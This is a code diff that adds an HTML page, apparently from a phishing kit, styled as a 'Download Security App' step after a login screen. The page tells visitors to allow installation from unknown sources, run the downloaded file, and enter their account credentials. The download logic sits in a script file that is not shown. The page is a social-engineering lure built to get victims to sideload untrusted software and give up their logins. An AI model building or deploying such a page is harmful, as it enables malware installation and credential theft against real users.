@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download Security App</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body class="bg-gray-100">
+    <div class="container mx-auto px-4 mt-8">
+        <div class="bg-white p-8 rounded-lg shadow-md max-w-2xl mx-auto">
+            <div class="text-center">
+                <div class="mb-6">
+                    <svg class="h-16 w-16 text-blue-600 mx-auto" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"></path>
+                    </svg>
+                </div>
+                <h1 class="text-3xl font-bold text-gray-800 mb-4">Download Security App</h1>
+                <p class="text-gray-600 mb-6">Please download and install our security application on your device. Follow the on-screen instructions to complete the setup and enhance your account security.</p>
+                
+                <div class="space-y-4 mb-8">
+                    <div class="bg-gray-50 p-4 rounded-lg">
+                        <h3 class="font-semibold text-gray-800 mb-2">Installation Instructions:</h3>
+                        <ol class="text-left text-gray-600 space-y-1">
+                            <li>1. Click the download button below</li>
+                            <li>2. Allow installation from unknown sources if prompted</li>
+                            <li>3. Open the downloaded file and follow setup instructions</li>
+                            <li>4. Enter your account credentials when prompted</li>
+                            <li>5. Complete the security verification process</li>
+                        </ol>
+                    </div>
+                </div>
+                
+                <div class="space-y-4">
+                    <button onclick="downloadApp()" class="bg-blue-600 text-white font-bold py-3 px-8 rounded-md hover:bg-blue-700 transition-colors">
+                        <span class="material-icons inline-block mr-2">download</span>
+                        Download Security App
+                    </button>
+                    <br>
+                    <a href="index.html" class="inline-block text-blue-600 hover:text-blue-800 transition-colors">
+                        Back to Login
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
